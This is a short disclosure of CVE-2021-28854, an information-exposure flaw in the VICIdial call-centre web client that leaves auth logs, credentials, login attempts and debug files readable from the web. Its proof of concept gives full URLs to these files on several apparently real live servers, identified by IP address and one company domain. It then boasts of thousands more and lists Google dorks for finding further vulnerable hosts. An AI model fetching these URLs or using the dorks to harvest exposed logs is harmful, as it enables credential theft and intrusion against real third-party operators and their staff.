# VICIdial - CVE-2021-28854
## Info/Impact
VICIdial's Web Client contains many sensitive files that can be access from the client side. These files contain mysqli logs, auth logs, debug information, successful and unsuccessful login attempts with their corresponding IP's, User-Agents, credentials and much more. This information can be leveraged by an attacker to gain further access to VICIdial systems. This vulnerability affects all versions as of 20/5/21

## PoC (Proof of Concept)

Potential Sensative files/endpoints:

/vicidial/project_auth_entries.txt

/vicidial/agent_reports/AGENT_DAY_<YEAR>-<MONTH>-<DAY>.TXT

/vicidial/agent_reports/

/vicidial/closer_SQL_updates.txt

/agc/vicidial_mysqli_errors.txt

/agc/vicidial_debug.txt

/agc/vicidial_auth_entries.txt

## Example URL's:

http://172.104.24.101/vicidial/project_auth_entries.txt

http://172.104.24.101/vicidial/agent_reports/

http://172.104.24.101/agc/vicidial_mysqli_errors.txt

http://172.104.24.101/agc/vicidial_debug.txt

http://172.104.24.101/agc/vicidial_auth_entries.txt


------------------------------------------------------


http://35.156.102.118/vicidial/project_auth_entries.txt

http://35.156.102.118/vicidial/agent_reports/

http://35.156.102.118/vicidial/closer_SQL_updates.txt

http://35.156.102.118/agc/vicidial_mysqli_errors.txt

http://35.156.102.118/agc/vicidial_debug.txt

http://35.156.102.118/agc/vicidial_auth_entries.txt


------------------------------------------------------


https://callsrevenue.com/vicidial/project_auth_entries.txt

https://callsrevenue.com/agc/vicidial_mysqli_errors.txt

https://callsrevenue.com/agc/vicidial_debug.txt

https://callsrevenue.com/agc/vicidial_auth_entries.txt


------------------------------------------------------


http://69.60.110.115/vicidial/agent_reports/

http://69.60.110.115/vicidial/closer_SQL_updates.txt

http://69.60.110.115/agc/vicidial_mysqli_errors.txt

http://69.60.110.115/agc/vicidial_debug.txt

+ Thousands More! :)

## Google Dorks to help find more!

"Agent web client:  Phone Login"

"Index of /vicidial"

inurl:/vicidial/welcome.php

intitle:Agent Timeclock

"Agent web client: Campaign Login"


